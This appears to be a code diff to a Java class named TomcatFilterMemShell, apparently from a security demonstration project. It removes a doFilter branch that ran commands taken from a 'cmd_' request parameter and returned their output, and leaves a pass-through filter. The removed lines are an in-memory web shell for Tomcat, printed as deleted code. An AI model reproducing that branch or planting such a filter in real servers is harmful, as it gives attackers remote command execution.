@@ -14,7 +14,6 @@ import org.apache.tomcat.util.descriptor.web.FilterMap;
 import java.lang.reflect.Constructor;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.Context;
-import org.joychou.security.SecurityUtil;
 import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
@@ -93,28 +92,7 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        String cmd;
-        if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            String[] argv = SecurityUtil.parseAllowedCommand(cmd);
-            if (argv == null) {
-                servletResponse.getOutputStream().write("Command not allowed".getBytes());
-                servletResponse.getOutputStream().close();
-                return;
-            }
-            Process process = Runtime.getRuntime().exec(argv);
-            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
-                    new java.io.InputStreamReader(process.getInputStream()));
-            StringBuilder stringBuilder = new StringBuilder();
-            String line;
-            while ((line = bufferedReader.readLine()) != null) {
-                stringBuilder.append(line).append('\n');
-            }
-            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
-            servletResponse.getOutputStream().flush();
-            servletResponse.getOutputStream().close();
-            return;
-        }
-
+        // Pass-through only: this filter never executes request-supplied commands.
         filterChain.doFilter(servletRequest, servletResponse);
     }
 
